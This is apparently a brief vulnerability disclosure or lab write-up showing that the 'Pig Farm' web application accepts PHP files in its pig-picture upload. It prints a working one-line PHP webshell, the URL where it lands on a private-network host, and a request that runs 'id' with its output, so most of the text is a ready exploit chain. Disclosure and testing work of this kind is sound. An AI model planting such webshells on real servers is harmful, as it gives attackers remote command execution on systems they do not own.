The Pig Farm application allows for unrestricted file upload.

When creating a new pig, you can choose to upload a file as the picture for the pig. This will allow you to upload PHP files.

I uploaded a simple PHP webshell:

```
<?php system($_GET['cmd']); ?>
```

You can browse to your shell at: 
```
http://10.211.55.10/pig/uploadfolder/test.php
```

Then execute arbitrary commands:

```
http://10.211.55.10/pig/uploadfolder/test.php?cmd=id


uid=1(daemon) gid=1(daemon) groups=1(daemon) 
```
